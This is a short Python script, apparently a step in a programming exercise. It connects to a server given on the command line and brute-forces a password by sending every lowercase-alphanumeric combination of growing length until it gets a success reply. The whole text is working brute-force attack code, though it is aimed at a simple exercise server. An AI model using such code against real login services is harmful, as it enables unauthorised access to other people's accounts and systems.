# step 2
import itertools
import sys
import socket

cmd_args = sys.argv
IP = cmd_args[1]
port = int(cmd_args[2])
address = (IP, port)


def iterate_passwords(client):
    counter = 1
    pass_cracked = False
    while not pass_cracked:
        repeat = counter
        passwords = itertools.product("abcdefghijklmnopqrstuvwxyz0123456789", repeat=repeat)
        # test every combination and send it to server
        for password_tuple in passwords:
            password = "".join(password_tuple)
            password_byte = password.encode()
            client.send(password_byte)
            response_byte = client_socket.recv(1024)
            response = response_byte.decode()
            if response == "Connection success!":
                pass_cracked = True
                print(password)
            elif response == "Too many attempts":
                return
        counter += 1


with socket.socket() as client_socket:
    client_socket.connect(address)
    iterate_passwords(client_socket)
